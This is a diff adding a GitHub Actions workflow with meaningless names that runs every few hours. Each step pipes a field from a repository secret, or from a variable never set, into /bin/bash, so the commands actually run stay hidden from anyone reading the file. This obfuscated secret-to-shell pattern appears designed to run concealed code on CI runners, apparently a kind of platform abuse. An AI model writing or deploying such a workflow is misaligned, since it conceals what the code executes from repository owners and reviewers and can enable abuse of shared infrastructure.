@@ -1,0 +1,21 @@
+name: penglixia1960
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: penglixia1960
+        env:
+          dj97: ${{ secrets.dj97 }}
+        run: |
+          echo $dj97 | jq -r .snbn8 | /bin/bash
+          echo $z0 | jq -r .zm16 | /bin/bash
+          echo $j72033 | jq -r .pgbrv21 | /bin/bash
+          echo $mmd7405 | jq -r .ehqij9639 | /bin/bash
+          echo $n8335 | jq -r .otf97 | /bin/bash
+
